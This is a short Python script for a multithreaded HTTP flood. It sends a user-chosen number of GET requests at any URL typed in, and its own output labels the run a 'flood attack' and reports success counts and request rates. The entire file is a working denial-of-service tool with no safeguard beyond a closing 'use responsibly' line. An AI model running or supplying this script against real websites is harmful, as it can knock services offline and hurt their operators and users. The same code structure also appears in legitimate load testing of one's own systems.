import requests
import threading
import time

def send_request(url, request_count, successful_requests, failed_requests):
    """
    Sends a single request to the specified URL and updates counters.

    Args:
        url (str): The URL to send the request to.
        request_count (int): The number of requests
        successful_requests (list): A list to store successful request counts.
        failed_requests (list): A list to store failed request counts.
    """
    try:
        response = requests.get(url)  # Or use requests.post, etc.
        #print(f"Request to {url} successful. Status Code: {response.status_code}") # Removed printing each request.
        successful_requests.append(1)  # Increment successful request count
    except requests.exceptions.RequestException as e:
        #print(f"Error sending request to {url}: {e}")  # Removed printing each error
        failed_requests.append(1) # Increment failed request count
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def flood(url, num_requests, num_threads):
    """
    Sends a large number of requests to a URL, simulating high traffic.

    Args:
        url (str): The URL to flood.
        num_requests (int): The total number of requests to send.
        num_threads (int): The number of threads to use.
    """
    print(f"Starting flood attack against {url} with {num_requests} requests and {num_threads} threads.")
    start_time = time.time()

    successful_requests = []
    failed_requests = []
    threads = []

    for _ in range(num_requests):
        t = threading.Thread(target=send_request, args=(url, num_requests, successful_requests, failed_requests))
        threads.append(t)
        if len(threads) >= num_threads:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            threads = []  # Clear the list after joining

    # Ensure any remaining threads are joined
    for thread in threads:
        thread.start()
        thread.join()
    end_time = time.time()
    duration = end_time - start_time
    total_successful_requests = len(successful_requests)
    total_failed_requests = len(failed_requests)
    print(f"Finished flood attack in {duration:.2f} seconds.")
    print(f"Total successful requests: {total_successful_requests}")
    print(f"Total failed requests: {total_failed_requests}")
    print(f"Requests per second: {num_requests / duration:.2f}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://127.0.0.1:5000/login): ")
    num_requests = int(input("Enter the number of requests to send: "))
    num_threads = int(input("Enter the number of threads to use: ")) # added num threads
    flood(target_url, num_requests, num_threads)
    print("Script finished.  Remember to use responsibly!")
